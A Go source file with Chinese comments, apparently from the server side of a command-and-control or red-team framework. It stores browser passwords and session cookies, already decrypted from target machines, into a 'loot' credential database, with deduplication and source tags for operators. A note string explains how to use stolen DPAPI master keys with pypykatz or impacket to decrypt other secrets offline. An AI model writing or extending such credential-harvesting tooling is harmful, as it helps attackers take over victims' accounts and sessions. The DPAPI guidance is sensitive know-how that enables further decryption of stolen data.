package api

import (
	"fmt"
	"strings"

	"BackendTemplate/pkg/cred"
)

// 浏览器凭据制品 → 凭据库（loot）入库。
//
// 与"命令产出自动识别"（WiFi 密码）不同，这里的输入是客户端**已经解密**的明文
// 结构化数据，不需要靠文本特征猜；但仍要守住两条：
//  1. 去重：同一台机器重复采集（或口令没变）不能把库刷满 —— 复用 AddLootIfNotEmpty
//     的 (uid,type,host,secret,source) 去重；
//  2. 归属：每条都带 source（browser:chrome / cookie:edge），操作员能看出这条是哪来的。
//
// 返回值是口令入库条数，Cookie 条数单独返回供任务结果展示（Cookie 量大，
// 不进"凭据"计数以免高估战果）。
func ingestBrowserArtifact(uid string, art cred.BrowserArtifact) (creds, cookies int) {
	for _, b := range art.Browsers {
		name := strings.ToLower(strings.TrimSpace(b.Name))
		if name == "" {
			name = "browser"
		}
		profile := strings.TrimSpace(b.Profile)
		if profile == "" {
			profile = "Default"
		}

		for _, c := range b.Credentials {
			realm := cred.RealmFromURL(c.URL)
			note := fmt.Sprintf("浏览器保存的登录口令；来源 %s/%s；登录地址 %s", name, profile, c.URL)
			AddLootIfNotEmpty(uid, "pwd", c.User, realm, art.Host, c.Pass, note, "browser:"+name)
			creds++
		}

		for _, c := range b.Cookies {
			// Cookie 不进"凭据"计数：它是会话材料，量大且需要操作员自行判断价值。
			// host 列统一用主机名（归属会话），域写进 realm —— 同一台机器上的
			// 多条 Cookie 因此在列表里按主机聚合，而不是按站点散开。
			secret := c.Name + "=" + c.Value
			note := fmt.Sprintf("浏览器 Cookie（%s/%s）；域 %s；路径 %s", name, profile, c.Host, c.Path)
			if c.HTTPOnly {
				note += "；HttpOnly"
			}
			if c.Secure {
				note += "；Secure"
			}
			AddLootIfNotEmpty(uid, "cookie", "", c.Host, art.Host, secret, note, "cookie:"+name)
			cookies++
		}
	}
	return creds, cookies
}

// browserArtifactNote 制品本体入库时的备注：告诉操作员这份 JSON 里有什么、
// 已经自动入库了多少，以及还能怎么用。
func browserArtifactNote(info cred.ArtifactInfo) string {
	return fmt.Sprintf(
		"浏览器凭据制品（明文 JSON）：%d 个浏览器配置 / %d 条口令 / %d 条 Cookie；"+
			"口令与 Cookie 已自动登记到凭据库（source=browser:*/cookie:*）。"+
			"制品本体保留用于复核与取回。",
		info.Browsers, info.Credentials, info.Cookies)
}

// dpapiArtifactNote DPAPI 主密钥制品的备注：强调它不能单独使用，
// 必须与目标机的 DPAPI blob（或浏览器 Local State / Credentials 目录）配合。
func dpapiArtifactNote(info cred.ArtifactInfo) string {
	return fmt.Sprintf(
		"DPAPI 主密钥集（用户作用域已解密，%s）：用 masterkey 可离线解密同一用户的其他 DPAPI blob；"+
			"配合浏览器 Local State 可还原浏览器主密钥。解析：pypykatz dpapi masterkey <GUID> <masterkey> 或 impacket dpapi。",
		info.Describe())
}
